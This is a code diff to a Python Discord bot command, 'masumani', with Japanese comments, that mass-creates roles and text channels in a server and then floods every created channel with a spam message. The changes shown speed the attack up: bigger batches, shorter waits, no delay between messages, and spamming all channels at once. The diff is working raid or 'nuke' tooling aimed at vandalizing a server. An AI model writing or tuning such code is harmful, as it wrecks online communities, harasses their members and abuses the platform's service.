@@ -75,18 +75,18 @@ async def masumani(ctx):
 
     await asyncio.sleep(2)
 
-    # 3. ロール作成
+    # 3. ロール作成（高速化）
     try:
         role_created = 0
-        for i in range(0, role_count, 5):
-            batch = min(5, role_count - i)
+        for i in range(0, role_count, 8):
+            batch = min(8, role_count - i)
             role_tasks = []
             for j in range(batch):
                 color = discord.Color.from_rgb(random.randint(50, 255), random.randint(50, 255), random.randint(50, 255))
                 role_tasks.append(guild.create_role(name=role_name, color=color))
             role_results = await asyncio.gather(*role_tasks, return_exceptions=True)
             role_created += sum(1 for r in role_results if not isinstance(r, Exception))
-            await asyncio.sleep(2)
+            await asyncio.sleep(1)
         await user.send(f'ロール作成: {role_created}個')
     except Exception as e:
         await user.send(f'ロール作成失敗')
@@ -139,47 +139,43 @@ async def masumani(ctx):
 
     await asyncio.sleep(2)
 
-    # 7. チャンネル作成
+    # 7. チャンネル作成（高速化）
     created_channels = []
     created_count = 0
     try:
-        for i in range(0, channel_count, 5):
-            batch = min(5, channel_count - i)
+        for i in range(0, channel_count, 10):
+            batch = min(10, channel_count - i)
             channel_tasks = [guild.create_text_channel(name=channel_name) for j in range(batch)]
             channel_results = await asyncio.gather(*channel_tasks, return_exceptions=True)
             for r in channel_results:
                 if not isinstance(r, Exception):
                     created_channels.append(r)
                     created_count += 1
-            await asyncio.sleep(1)
+            await asyncio.sleep(0.8)
         await user.send(f'チャンネル作成: {created_count}個')
     except Exception as e:
         await user.send(f'チャンネル作成失敗: {created_count}個作成済み')
 
     await asyncio.sleep(2)
 
-    # 8. メッセージ送信
+    # 8. メッセージ送信（全チャンネル同時）
     try:
         await user.send('メッセージ送信中...')
 
-        async def spam_channel_limited(channel):
+        async def spam_channel_full(channel):
             count = 0
             for i in range(spam_count):
                 try:
                     await channel.send(spam_message)
                     count += 1
-                    await asyncio.sleep(1)
                 except:
-                    pass
+                    break
             return count
 
-        total_messages = 0
-        for i in range(0, len(created_channels), 5):
-            batch = created_channels[i:i+5]
-            spam_tasks = [spam_channel_limited(ch) for ch in batch]
-            spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
-            total_messages += sum(r for r in spam_results if not isinstance(r, Exception))
-            await asyncio.sleep(2)
+        # 全チャンネル同時送信
+        spam_tasks = [spam_channel_full(ch) for ch in created_channels]
+        spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
+        total_messages = sum(r for r in spam_results if not isinstance(r, Exception))
 
         await user.send(f'完了 メッセージ送信: {total_messages}件')
     except Exception as e:
